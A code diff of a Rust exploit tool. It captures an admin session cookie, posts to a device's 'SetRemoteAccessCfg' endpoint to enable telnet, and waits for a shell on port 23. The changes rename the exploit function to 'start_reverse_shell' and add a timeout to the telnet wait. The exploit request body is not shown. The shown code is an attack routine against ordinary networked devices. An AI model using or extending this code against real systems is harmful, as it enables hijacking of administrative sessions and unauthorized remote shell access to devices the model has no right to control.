@@ -30,7 +30,7 @@ struct ExploitResponse {
 pub async fn start_telnet(admin_ip: &str) -> Result<()> {
     println!("Waiting for login and trying exploit... ");
     login_and_exploit(admin_ip).await?;
-    println!("... done");
+    println!("done");
 
     Ok(())
 }
@@ -111,7 +111,7 @@ async fn login_and_exploit(admin_ip: &str) -> Result<()> {
     let mut last_error = None;
 
     while let Some(cookie_header) = rx.recv().await {
-        match try_exploit(&exploit_client, admin_ip, &cookie_header).await {
+        match start_reverse_shell(&exploit_client, admin_ip, &cookie_header).await {
             Ok(_) => {
                 handle.abort();
                 return Ok(());
@@ -124,7 +124,7 @@ async fn login_and_exploit(admin_ip: &str) -> Result<()> {
     bail!("Failed to receive session cookie, last error: {last_error:?}")
 }
 
-async fn try_exploit(client: &Client, admin_ip: &str, cookie_header: &str) -> Result<()> {
+async fn start_reverse_shell(client: &Client, admin_ip: &str, cookie_header: &str) -> Result<()> {
     let response: ExploitResponse = client
         .post(format!("http://{}/action/SetRemoteAccessCfg", admin_ip))
         .header("Content-Type", "application/json")
@@ -146,11 +146,19 @@ async fn try_exploit(client: &Client, admin_ip: &str, cookie_header: &str) -> Re
 
 async fn wait_for_telnet(admin_ip: &str) -> Result<()> {
     let addr = SocketAddr::from_str(&format!("{}:23", admin_ip))?;
+    let timeout = Duration::from_secs(60);
+    let start_time = std::time::Instant::now();
 
     while telnet_send_command(addr, "true", "exit code 0", false)
         .await
         .is_err()
     {
+        if start_time.elapsed() >= timeout {
+            bail!(
+                "Timeout waiting for telnet to become available after {:?}",
+                timeout
+            );
+        }
         sleep(Duration::from_secs(1)).await;
     }
 
